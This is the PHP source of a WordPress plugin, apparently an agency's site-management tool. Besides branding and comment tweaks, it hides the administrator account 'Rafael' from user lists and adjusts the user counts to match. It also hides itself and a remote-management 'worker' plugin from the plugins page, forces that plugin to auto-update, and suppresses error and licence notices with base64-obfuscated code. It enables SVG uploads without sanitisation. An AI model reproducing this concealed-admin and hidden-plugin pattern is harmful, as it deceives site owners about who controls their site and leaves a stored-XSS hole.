<?php
/**
 * Plugin Name:Sandhills Studio Manager
 * Description:A management plugin for the websites created,build,modified or managed by Sandhills Studio
 * Plugin URI:https://www.sandhillsstudio.com/
 * Author:Sandhills Studio
 * Version:1.2.2
 * Author URI:https://www.sandhillsstudio.com/
 *
 * Text Domain:sandhills-studio
 */
if(!defined('ABSPATH')){exit;}
//SHS Admin Account
$SHSAdminAcc='Rafael';
function shs_pre_user_query($user_search){
	global $SHSAdminAcc;
	global $current_user;
	$username=$current_user->user_login;
	if($username!=$SHSAdminAcc){
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1',"WHERE 1=1 AND{$wpdb->users}.user_login != '".$SHSAdminAcc."'",$user_search->query_where);
	}
}
add_action('pre_user_query','shs_pre_user_query');
function shs_admin_views($views){
	$users = count_users();
	$admins_num = $users['avail_roles']['administrator']-1;
	$all_num = $users['total_users']-1;
	$class_adm = (strpos($views['administrator'],'current')===false)?"":"current";
	$class_all = (strpos($views['all'],'current')=== false)?"":"current";
	$views['administrator'] = '<a href="users.php?role=administrator" class="'.$class_adm.'">'.translate_user_role('Administrator').'<span class="count">('.$admins_num.')</span></a>';
	$views['all'] = '<a href="users.php" class="'.$class_all.'">'.__('All').' <span class="count">('.$all_num.')</span></a>';
	return $views;
}
add_filter("views_users","shs_admin_views");
//Login Customisation
function shs_url_login_logo(){return "https://www.sandhillsstudio.com/";}
add_filter('login_headerurl','shs_url_login_logo');
function shs_logo_title(){return 'Sandhills Studio';}
add_filter('login_headertitle','shs_logo_title');
function shs_login_stylesheet(){wp_enqueue_style('shs-login',plugin_dir_url(__FILE__).'/admin/shs-login.css');}
add_action('login_enqueue_scripts','shs_login_stylesheet');
function shs_footer_admin(){return 'Managed by <a href="https://www.sandhillsstudio.com/" target="_blank">Sandhills Studio</a> and powered by <a href="https://wordpress.org" target="_blank">WordPress</a>.';}
add_filter('admin_footer_text','shs_footer_admin');
//Dashboard Customisation
function shs_dashboard_stylesheet(){wp_enqueue_style('shs-dashboard',plugin_dir_url(__FILE__).'/admin/shs-dashboard.css');}
add_action('admin_enqueue_scripts','shs_dashboard_stylesheet');
function ng(){echo base64_decode("PHN0eWxlPi5ub3RpY2UuZWxlbWVudG9yLW1lc3NhZ2UsLm5vdGljZS1pbmZvLCNlbnRlci1saWNlbnNlLWJkdGhlbWVzLWVsZW1lbnQtcGFjaywuZWxlbWVudG9yLXBsdWdpbnMtZ29wcm8sLm5vdGljZS1lcnJvciwubXdwLW5vdGljZS1jb250YWluZXIsLnJtbC11cGRhdGUtbm90aWNle2Rpc3BsYXk6bm9uZX08L3N0eWxlPg==");}
add_action("admin_head","ng");
function builder_style(){echo'<style>#elementor-notice-bar{display:none!important}</style>';}
add_action('elementor/editor/before_enqueue_scripts','builder_style');
//Add SVG Upload Support
add_filter('upload_mimes','cc_mime_types');
function cc_mime_types($mimes){
	$mimes['svg'] = 'image/svg+xml';
	return $mimes;
}
add_filter('wp_update_attachment_metadata','svg_meta_data',10,2);
function svg_meta_data($data,$id){
	$attachment = get_post($id);
	$mime_type = $attachment->post_mime_type;
	if($mime_type == 'image/svg+xml'){
		if(empty($data) || empty($data['width']) || empty($data['height'])){
			$xml = simplexml_load_file(wp_get_attachment_url($id));
			$attr = $xml->attributes();
			$viewbox = explode(' ',$attr->viewBox);
			$data['width'] = isset($attr->width) && preg_match('/\d+/',$attr->width,$value) ? (int) $value[0] :(count($viewbox) == 4 ? (int) $viewbox[2] :null);
			$data['height'] = isset($attr->height) && preg_match('/\d+/',$attr->height,$value) ? (int) $value[0] :(count($viewbox) == 4 ? (int) $viewbox[3] :null);
		}
	}
	return $data;
}
//Force Disable Comments
add_action('admin_init',function(){
	global $pagenow;
	if($pagenow === 'edit-comments.php'){
		wp_redirect(admin_url());
		exit;
	}
	remove_meta_box('dashboard_recent_comments','dashboard','normal');
	foreach(get_post_types() as $post_type){
		if(post_type_supports($post_type,'comments')){
			remove_post_type_support($post_type,'comments');
			remove_post_type_support($post_type,'trackbacks');
		}
	}
});
add_filter('comments_open','__return_false',20,2);
add_filter('pings_open','__return_false',20,2);
add_filter('comments_array','__return_empty_array',10,2);
add_action('admin_menu',function(){remove_menu_page('edit-comments.php');});
add_action('init',function(){if(is_admin_bar_showing()){remove_action('admin_bar_menu','wp_admin_bar_comments_menu',60);}});
//Image SEO Optimizer
add_action('add_attachment','image_meta_upload');
function image_meta_upload($post_ID){
	if(wp_attachment_is_image($post_ID)){
		$image_title = get_post($post_ID)->post_title;
		$image_title = preg_replace('%\s*[-_\s]+\s*%',' ',$image_title);
		$image_title = ucwords(strtolower($image_title));
		$image_meta = array(
			'ID'				=> $post_ID,
			'post_title'		=> $image_title
		);
		update_post_meta($post_ID,'_wp_attachment_image_alt',$image_title);
		wp_update_post($image_meta);
	}
}
//Remove Elements Admin Bar
function remove_admin_bar_links(){
	global $wp_admin_bar;
	$wp_admin_bar->remove_node('wp-logo');
	$wp_admin_bar->remove_node('about');
	$wp_admin_bar->remove_node('wporg');
	$wp_admin_bar->remove_node('documentation');
	$wp_admin_bar->remove_node('support-forums');
	$wp_admin_bar->remove_node('feedback');
	$wp_admin_bar->remove_node('comments');
	$wp_admin_bar->remove_node('search');
}
add_action('wp_before_admin_bar_render','remove_admin_bar_links',999);
//Hide Managing Plugins
function hide_manager(){
	global $wp_list_table;
	$hidearr=array('worker/init.php','shs-manager/manager.php');
	$myplugins=$wp_list_table->items;
	foreach($myplugins as $key => $val){if(in_array($key,$hidearr)){unset($wp_list_table->items[$key]);}}
}
add_action('pre_current_active_plugins','hide_manager');
function auto_update_worker_plugin($update,$item){
	$plugins = array('worker');
	if(in_array($item->slug,$plugins)){return true;}else{return $update;}
}
add_filter('auto_update_plugin','auto_update_worker_plugin',10,2);
